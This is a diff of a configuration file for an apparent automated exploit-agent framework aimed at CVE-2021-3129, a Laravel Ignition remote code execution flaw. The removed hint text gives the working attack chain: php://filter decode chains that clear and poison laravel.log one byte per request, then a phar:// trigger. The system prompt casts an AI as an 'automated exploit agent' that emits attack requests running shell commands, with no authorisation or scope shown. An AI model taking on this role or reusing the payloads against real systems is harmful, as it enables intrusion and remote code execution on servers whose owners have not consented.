@@ -20,9 +20,9 @@ target:
     Content-Type: application/json
 
 # ─── جدید ───
-# laravel_phar_gen.py باید کل requests array را چاپ کنه (نه فقط base64):
-#   [clear, poison_byte_0, poison_byte_1, ..., poison_byte_N, trigger]
-# همون arrayی که در نهایت زیر {"requests": ...} قرار می‌گیره.
+# اسکریپت کل requests array را چاپ می‌کند:
+#   [clear, poison_byte_0, ..., poison_byte_N, trigger]
+# با sys.stdout.write (بدون newline انتهایی) تا جایگزینی raw تمیز باشد.
 shell:
   script_path: "./scripts/laravel_phar_gen.py"
   timeout_secs: 30
@@ -38,40 +38,35 @@ evaluator:
 hints:
   - after_attempt: 2
     message: |
-      HINT: CVE-2021-3129 needs MANY ordered POST requests:
-        1 clear + one-per-byte of the phar (in order) + 1 trigger.
+      HINT: Do NOT build the requests array by hand — there are hundreds of
+      one-byte poison requests. The shell script `laravel_phar_gen.py` builds
+      the whole array for you. Just emit:
 
-      CLEAR:
-        variableName = "x"
-        viewFile = "php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/www/storage/logs/laravel.log"
+        {"requests": {{shell_output ["id"]}}}
 
-      POISON (one POST per byte of the phar payload, in order):
-        variableName = exactly ONE byte (URL-encode bytes outside 0x20-0x7E)
-        viewFile = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log"
-
-      TRIGGER (after all bytes are written):
-        variableName = "x"
-        viewFile = "phar:///var/www/storage/logs/laravel.log/test.txt"
+      The script internally produces, in order:
+        1 clear POST
+        N poison POSTs (one per byte of the base64 PHAR)
+        1 trigger POST using phar:///var/www/storage/logs/laravel.log/test.txt
 
 system_prompt: |
   You are an automated exploit agent for CVE-2021-3129 (Laravel Ignition RCE).
 
   ### SHELL EXECUTION
-  The script `laravel_phar_gen.py` emits the COMPLETE `requests` JSON array
-  needed for CVE-2021-3129 (clear + one-per-byte poison + trigger), for the
-  command given as its single argument.
+  The script `laravel_phar_gen.py` builds the COMPLETE `requests` JSON array
+  for CVE-2021-3129 (clear + one-byte-per-POST poison + trigger) for the given
+  command.
 
-  Invoke it with EXACTLY ONE placeholder, OUTSIDE of any JSON string, at
-  the value position of the top-level `requests` field:
+  Invoke it with EXACTLY ONE placeholder, placed at the VALUE position of the
+  top-level `requests` field (NOT inside any JSON string, NOT quoted):
 
     {"requests": {{shell_output ["id"]}}}
 
-  Aegis replaces the entire placeholder with the raw stdout of the script
-  (a valid JSON array). Your output must remain valid JSON after the
-  substitution. Do NOT put the placeholder inside quotes; do NOT escape it.
+  Aegis substitutes the script's raw stdout (a valid JSON array) at that
+  position. Your output must remain valid JSON after substitution.
+  Do NOT wrap the placeholder in quotes. Do NOT escape it.
 
-  - Emit EXACTLY ONE placeholder per response.
-  - Do not reformat, do not add newlines, no markdown, no explanation.
+  ### EXACT RESPONSE FORMAT
+  Your output must be EXACTLY this JSON, one line, no markdown, no explanation:
 
-  ### EXACT RESPONSE
   {"requests": {{shell_output ["id"]}}}
